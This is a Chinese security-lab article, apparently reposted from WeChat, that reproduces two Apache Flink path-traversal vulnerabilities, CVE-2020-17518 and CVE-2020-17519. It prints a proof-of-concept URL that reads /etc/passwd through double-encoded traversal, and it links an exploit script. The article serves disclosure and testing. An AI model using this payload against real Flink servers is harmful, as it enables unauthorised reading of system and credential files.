> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pcKJ_Ucp1S0Ve9r5CaPtWw)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQnibhaibbznlzjxrWLpF8npgIA1iaHetNibicdmZOSIuZO4UBHaiabYicrVmknkNP4rVTxYmpcQNsA0cu7A/640?wx_fmt=png)

本月，Apache Flink 项目公开了该框架中的两个严重的路径遍历漏洞，攻击者可以通过该漏洞在易受攻击的系统上上传和查看任意文件。

Apache Flink 是一个用 Java 和 Scala 编写的开源统一流处理和批处理框架。在披露后的几个小时内，黑客已发布了漏洞的 PoC，可用于攻击存在漏洞的 Apache Flink 实例。

**漏洞复现**

部署 flink-1.11.2[1]

**CVE-2020-17518：通过路径遍历上传任意文件**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ6zmbJT8JmSXZIpRYEIsDhLv22OZRPqemcHjukDFAPTkHnVavPNiaeIedLRO3eYBJicQ3b6YhfuFXQ/640?wx_fmt=png)

**POC:**

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ6zmbJT8JmSXZIpRYEIsDhDDHbW2ibITiafzMK441K9tKaonFVuFibudf7vI7qF4d17W027b0sR1eqg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ6zmbJT8JmSXZIpRYEIsDhUAG1ZSqT3Ybyiajgc6QMMicnFL5bfmCWv5XVuicCGWYDuBpqpSRsuPF1w/640?wx_fmt=png)

**CVE-2020-17519：通过路径遍历读取任意文件**

**POC:**

| 

http://10.0.0.2:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd

 |

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnQ6zmbJT8JmSXZIpRYEIsDhezMtYJ2ltqbia57HC45NwuHriaepvtEZVnC0qDCR8haxhGG7DywGC0Cg/640?wx_fmt=png)

**参考链接**

1.  https://archive.apache.org/dist/flink/flink-1.11.2/
    
2.  https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17518
    
3.  https://github.com/B1anda0/CVE-2020-17519/blob/main/CVE-2020-17519.py
    

**关于山石网科安全技术研究院**

  

  

  

    山石安研院是山石网科的信息安全智库部门，主要负责反 APT 研究、出战及承办全球攻防赛事、高端攻防技术培训、全球中英文安全预警分析发布、各类软硬件漏洞挖掘和利用研究、承接国家网络安全相关课题、不定期发布年度或半年度的各类技术报告及公司整体攻防能力展现。技术方向包括移动安全、虚拟化安全、工控安全、物联安全、区块链安全、协议安全、源码安全、反 APT 及反窃密。  
    为多省公安厅提供技术支撑工作，为上合峰会、财富论坛、金砖五国等多次重大活动提供网络安保支撑工作。在多次攻防赛事中连获佳绩，网安中国行第一名，连续两届红帽杯冠军、网鼎杯线上第一名，在补天杯、极棒杯、全国多地的护网演习等也都获得优秀的成绩，每年获得大量的 CNVD、CNNVD、CICSVD、CVE 证书、编号和致谢。如需帮助请咨询 hslab@hillstonenet.com

![](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnSWuIjGFp2q9CdPia5gDNPoVcTmJNicOGv7G8JhomWthCbtIGXrhLJeia8F5FbTwY6tGJHOxA74xbCGQ/640?wx_fmt=jpeg)